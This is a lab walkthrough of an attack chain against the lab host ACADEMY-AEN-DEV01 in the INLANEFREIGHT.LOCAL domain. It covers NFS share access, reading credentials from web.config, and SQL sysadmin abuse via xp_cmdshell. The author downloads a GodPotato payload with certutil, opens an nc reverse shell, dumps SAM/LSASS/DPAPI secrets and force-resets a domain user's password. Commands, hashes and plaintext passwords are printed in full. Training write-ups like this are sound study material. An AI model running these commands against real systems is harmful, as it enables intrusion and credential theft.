# 172.16.8.20 - ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ sudo nmap 172.16.8.20 -p- -sV -sC -T4 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 19:49 EST
Nmap scan report for 172.16.8.20
Host is up (0.052s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-12-11T23:26:22
|_Not valid after:  2026-06-12T23:26:22
|_ssl-date: 2025-12-13T00:51:32+00:00; +4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-AEN-DEV
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-13T00:51:21+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-12T23:26:27
|_Not valid after:  2055-12-12T23:26:27
| ms-sql-info: 
|   172.16.8.20\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 49730
|_    Clustered: false
| ms-sql-ntlm-info: 
|   172.16.8.20\SQLEXPRESS: 
|     Target_Name: INLANEFREIGHT
|     NetBIOS_Domain_Name: INLANEFREIGHT
|     NetBIOS_Computer_Name: ACADEMY-AEN-DEV
|     DNS_Domain_Name: INLANEFREIGHT.LOCAL
|     DNS_Computer_Name: ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
|     DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-12-13T00:51:32+00:00; +3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
|_nbstat: NetBIOS name: ACADEMY-AEN-DEV, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:c0:ca (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-13T00:51:22
|_  start_date: N/A

```

### 2049 - NFS

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ showmount -e ACADEMY-AEN-DEV01.inlanefreight.local
Export list for ACADEMY-AEN-DEV01.inlanefreight.local:
/DEV01 (everyone)
```

Mount the folder

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ sudo mount -t nfs ACADEMY-AEN-DEV01.inlanefreight.local:/ ./target/ -o nolock
```

```
bf22a1d0acfca4af517e1417a80e92d1
```

We find a password

```shellscript
┌──(kali㉿kali)-[~/…/AEN/target/DEV01/DNN]
└─$ cat web.config
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
        <value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
</configuration>
```

Administrator:D0tn31Nuk3R0ck\$$@123

### 80 - HTTP

We can login to the following website with the found credentials above

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FtPFC0beQeUFfH8bY7zfW%2Fimage.png?alt=media&#x26;token=4335a3ea-7841-48e5-8435-f8e584ae4ecd" alt=""><figcaption></figcaption></figure>

We find a SQL console. Running a query, we see that we are DB admin. Let's add a new user and make him admin

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FirUYprYgLcs0rM4uCPnE%2Fimage.png?alt=media&#x26;token=a2cfe95a-2ea3-4542-b302-4c73541d5285" alt=""><figcaption></figcaption></figure>

```shellscript
SELECT IS_SRVROLEMEMBER('sysadmin');
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

We can now login to the MSSQL DB

### 49730 - MSSQL

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN/target/DEV01]
└─$ mssqlclient.py inlanefreight.local/hacker:'P@ssword123!'@ACADEMY-AEN-DEV01.inlanefreight.local -port 49730
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-AEN-DEV\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-AEN-DEV\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (hacker  dbo@master)>
```

We enable command execution and run commands

```shellscript
SQL (hacker  dbo@master)> enable_xp_cmdshell
INFO(ACADEMY-AEN-DEV\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ACADEMY-AEN-DEV\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (hacker  dbo@master)> RECONFIGURE
SQL (hacker  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$sqlexpress
```

We see that our user has SeImpersonatePrivilege

```shellscript
SQL (hacker  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We transfer the files to the target

```shellscript
SQL (hacker  dbo@master)> xp_cmdshell certutil -f -urlcache http://172.16.8.120:4444/GodPotato-NET4.exe C:\Users\Public\potato.exe
output                                                
---------------------------------------------------   
****  Online  ****                                    
CertUtil: -URLCache command completed successfully.
```

We run the exploit and get a SYSTEM shell

```shellscript
QL (hacker  dbo@master)> xp_cmdshell C:\Users\Public\potato.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe 172.16.8.120 9002"

┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ rlwrap nc -lnvp 9002
listening on [any] 9002 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34888
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```
K33p_0n_sp00fing!
```

We dump the hashes with LaZagne

```shellscript
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
hacker:1002:aad3b435b51404eeaad3b435b51404ee:806a77b92e4308f72e55874e31b61158:::
```

We get a password with DPAPI

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ nxc smb ACADEMY-AEN-DEV01.inlanefreight.local -u hacker -p 'Hacked@123' --dpapi --local-auth
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:None)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\hacker:Hacked@123 (Pwn3d!)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Got 10 decrypted masterkeys. Looting secrets...
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{E1AE7D58-19CB-4F2A-B5A9-9E2B415A2AF2} - ACADEMY-AEN-DEV\mpalledorous:1squints2
```

mpalledorous:1squints2

We run bloodhound on the machine as we are domain joined

We see that the user hporter has a session in Academy-AEN-DEV

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FaQSIy0KFtHWHACu68eUN%2Fimage.png?alt=media&#x26;token=003732f8-0e04-4bfc-b3b9-ad69a47f4834" alt=""><figcaption></figcaption></figure>

We can try to dump lsass in case his credentials are stored

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ nxc smb ACADEMY-AEN-DEV01.inlanefreight.local -u Administrator -H 0e20798f695ab0d04bc138b22344cea8 --local-auth -M lsassy
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:None)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
LSASSY      172.16.8.20     445    ACADEMY-AEN-DEV  Saved 18 Kerberos ticket(s) to /home/kali/.nxc/modules/lsassy
LSASSY      172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\hporter d17ebeb6a724a3767774a21388c7ea59
```

hporter:d17ebeb6a724a3767774a21388c7ea59

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ nxc smb DC01.inlanefreight.local -u hporter -H d17ebeb6a724a3767774a21388c7ea59        
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\hporter:d17ebeb6a724a3767774a21388c7ea59s
```

Secretsdump would have done everything at the same time : SAM and LSASS

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ secretsdump.py Administrator@ACADEMY-AEN-DEV01.inlanefreight.local -hashes :0e20798f695ab0d04bc138b22344cea8
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
hacker:1002:aad3b435b51404eeaad3b435b51404ee:806a77b92e4308f72e55874e31b61158:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
INLANEFREIGHT\ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:98dfa4de87772b835de6697f1a4ca27eb081f5b222ccdd31057dcda7529f6701
INLANEFREIGHT\ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:b421aa9f700d485f7237b88d96320e85
INLANEFREIGHT\ACADEMY-AEN-DEV$:des-cbc-md5:a157041f4c7358ea
INLANEFREIGHT\ACADEMY-AEN-DEV$:plain_password_hex:c0a06ea54a2be46c25b7aca0b9e92195370afb77ae3eca6c938eb0b05acd5d9581f39956caae810da60eda68a4d66ebcdb8f3fe9a231b51a14fa6ad32e40b10d7acab9373feb1b39a7483644e2d07ce35867276ca57bfae891d590fa3bf0187b2302633a737586eadb560f9ef0b4a9afd9b98f179b402c099172e539dca181f86cf83cfa0c8b39ee25ceeb42b8fdf57b13c1dc872c1f98cd58ba51ab11731518539fea44eb933f30906d21a62da859709cda7d9a9eb49a4f36327ef18b0242ee389fc50ea603efe329917afd9555d1d60147a30a89e6eea6fd2c086cbc68d40a5fa9e436997d7fb45055a0dbbf39b10f
INLANEFREIGHT\ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:e7c233ad20a304f9dc556121dc3ae5a1:::
[*] DefaultPassword 
INLANEFREIGHT\hporter:Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

hporter:Gr8hambino!

hporter has force change password over ssmalls

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FfM3UKwikfES5uVXZ7dcm%2Fimage.png?alt=media&#x26;token=278c433e-6ae2-4b92-b0f5-93bb4f2a4a05" alt=""><figcaption></figcaption></figure>

We change his password

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN/target/DEV01]
└─$ bloodyAD --host DC01.inlanefreight.local -d "inlanefreight.local" -u "hporter" -p Gr8hambino! set password "ssmalls" "Hacked@123"
[+] Password changed successfully!
```

Test the new creds

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN/target/DEV01]
└─$ nxc smb DC01.inlanefreight.local -u ssmalls -p Hacked@123      
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Hacked@123
```
